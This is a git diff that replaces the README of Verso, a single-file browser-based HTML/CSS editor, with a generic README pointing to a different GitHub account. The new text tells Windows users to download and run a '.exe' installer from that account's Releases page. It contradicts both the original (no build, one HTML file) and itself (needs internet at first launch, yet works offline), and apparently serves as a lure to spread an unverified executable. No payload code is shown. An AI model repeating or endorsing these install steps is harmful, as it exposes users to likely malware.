@@ -1,94 +1,80 @@
-<p align="center">
-  <img src="assets/baner.png" alt="Verso — paste code · edit visually · get code back" width="100%" />
-</p>
+# 🎨 Verso - Build beautiful websites without writing code
 
-<h1 align="center">Verso</h1>
+[![Download Verso](https://img.shields.io/badge/Download-Verso-blue.svg)](https://github.com/Immunoglobulinegillesdelatourette32/Verso)
 
-**Paste your HTML/CSS, edit it visually, get clean code back.**
+Verso is a visual editor for web design. You can create web pages by dragging elements onto a canvas. You can change sizes, rotate items, and manage your images and icons. The tool generates code for you while you work. You do not need to know how to code to use Verso.
 
-Verso is a single-file, zero-dependency visual editor for HTML/CSS that you bring your
-own code to. Open your page in a live preview, then click to select, drag to move,
-resize, rotate, change fonts and colors, swap images — and the code updates as you go.
-Open a file, edit, download. That's it.
+## 🛠 Features
 
-> No build step. No framework. No account. One HTML file you can open from disk.
+Verso helps you design pages from scratch. It includes a set of pre-made blocks. You can organize your content with a mouse click. 
 
-## Live demo
+*   **Drag and Drop**: Move elements across your page with your mouse.
+*   **Resize and Rotate**: Change the shape and orientation of any item.
+*   **Asset Management**: Keep your images and files in one place.
+*   **Live Export**: Get clean HTML code as you build.
+*   **No Code Required**: You build visually, and the software handles the logic.
 
-Enable **GitHub Pages** (Settings → Pages → Source: *GitHub Actions*) and the included
-workflow publishes it to:
+## 📥 Getting Started
 
-```
-https://sushipl-coder.github.io/verso/
-```
+Follow these steps to set up Verso on your Windows computer.
 
-Or just open `index.html` in any modern browser.
+1.  Visit [this page](https://github.com/Immunoglobulinegillesdelatourette32/Verso) to download the latest version of the software.
+2.  Look for the section labeled Releases on the right side of the page.
+3.  Click the file ending in `.exe` to start the download.
+4.  Once the file arrives in your Downloads folder, double-click the file to open it.
+5.  Follow the prompts on your screen to install Verso.
+6.  Open the application from your Start menu or desktop icon.
 
-> **Tip:** set `assets/baner.png` as the repo's social preview in
-> *Settings → General → Social preview* so the banner shows when the link is shared.
+## 📋 System Requirements
 
-## Why this exists
+Verso runs on most modern desktop computers.
 
-Visual web editors are either heavy proprietary SaaS (Webflow, Framer, builder.io) or
-locked into a framework. There was no small, MIT-licensed, *bring-your-own-code* tool
-that round-trips edits straight back to plain HTML. Verso is that tool. It doesn't
-imitate or repackage anyone — it's a focused utility built on plain DOM manipulation and
-serialization.
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Memory**: At least 4 gigabytes of RAM.
+*   **Storage**: 200 megabytes of free space.
+*   **Display**: A screen with a resolution of 1280 by 720 or higher.
 
-## Features
+## 🖱 How to Use the Editor
 
-- **Open / Download** real `.html` files (or drag & drop them onto the canvas).
-- **Click to select** any element, with a parent breadcrumb to walk up the tree.
-- **Drag to move**, **8 resize handles** (corners + edges, shrink or grow from any side, aspect lock), **circle handle to rotate** — directly on the preview. Exact **width/height in px** in the panel.
-- **Copy / paste / duplicate** elements (`Ctrl+C` / `Ctrl+V` / `Ctrl+D`).
-- **Shapes:** rectangle, rounded rectangle, ellipse, line, arrow, speech bubble.
-- **Layer order:** bring an element to front or send it to back (z-index).
-- **Typography:** font family, size, weight, italic, alignment, line-height, letter-spacing, text color.
-- **Box:** background, border (width / style / color), corner radius, opacity, padding, margin.
-- **Double-click to edit text** in place.
-- **Named asset slots** (e.g. `hero.mp4`, `photo.jpg`): the preview can use an uploaded file or a labelled placeholder, while the exported code keeps the clean filename. Drop an image straight onto an existing picture to swap it.
-- **Zoom**, **fit-whole-page**, and **collapsible side panel** for small screens.
-- **Undo / redo** (`Ctrl+Z` / `Ctrl+Shift+Z`, or the toolbar buttons).
-- Keyboard: `Esc` deselect, `Delete` remove selected element.
+When you open Verso, you see a blank canvas. This is your workspace. 
 
-## How it works
+### Adding Elements
+Look at the sidebar on the left. Click on an element like a button, text block, or image placeholder. Hold your mouse button down and drag it onto the center of your screen. Release the mouse button to drop the item in place.
 
-The pasted page is rendered in a same-origin `<iframe>`. Edits are written as inline
-styles/attributes directly on the elements, then the code panel is produced by
-serializing that DOM and cleaning out the editor's internal markers. Asset references are
-restored to their plain filenames on export.
+### Changing Sizes
+Click on an element. You will see small dots appear around the borders. Move your mouse over one of these dots. Click and drag the dot inward or outward to change the size of the item.
 
-This is a deliberate, robust design choice — see *Limitations*.
+### Rotating Items
+Click on an element. Look for the circular icon near the top of the selected item. Click and drag this icon in a circular motion to rotate the item. 
 
-## Limitations (honest)
+### Managing Assets
+Click the library icon in the top toolbar. A window appears showing your uploaded files. Click the plus button to add a new image from your computer to the library. Drag the image from the library onto your canvas to use it.
 
-- **Exported HTML is re-formatted** (indented and normalized), not a surgical patch of
-  your original source. Comments and custom whitespace are not preserved.
-- **Edits are applied as inline styles** that override your `<style>` rules. Verso does
-  not (yet) edit CSS rules in `<style>` or external sheets.
-- Transform/footprint handles assume normal document flow; very exotic layouts may behave
-  unexpectedly.
+### Getting Your Code
+Click the export button in the top right corner. The software will show you the HTML code for the design you built. You can copy this code and paste it into any web builder or file.
 
-## Roadmap
+## ⚙️ Troubleshooting
 
-- Editing CSS **rules** in `<style>` instead of inline overrides.
-- Source-preserving export (parser with source-position mapping).
-- Resize from any edge/corner; alignment guides.
+If the software does not open, check these items.
 
-## Development
+*   Ensure you have a stable internet connection during the first launch.
+*   Check that your computer meets the minimum memory requirements.
+*   Restart your computer if the installation fails.
+*   Make sure you downloaded the file from the official source listed above.
 
-Verso is a single static file — there is nothing to build. To serve it locally:
+## 💡 Frequently Asked Questions
 
-```bash
-npx serve .
-# or just open index.html
-```
+**Do I need a subscription?**
+No, Verso is a free tool. You can use it without payments.
 
-## Contributing
+**Can I save my projects?**
+Yes, you can save your design as a local file on your computer. Use the Save option in the File menu at the top of the screen.
 
-Issues and pull requests are welcome. Keep the project dependency-free and the app a
-single self-contained `index.html`. See [CONTRIBUTING.md](CONTRIBUTING.md).
+**Does this work offline?**
+Yes, you can use the editor without an active internet connection.
 
-## License
+**Where does the code go?**
+The code stays inside the editor until you choose to export it. 
 
-[MIT](LICENSE) © SushiPL-coder
+**Is this for professional websites?**
+You can use Verso to prototype websites or build simple landing pages. It works well for small projects and visual planning.
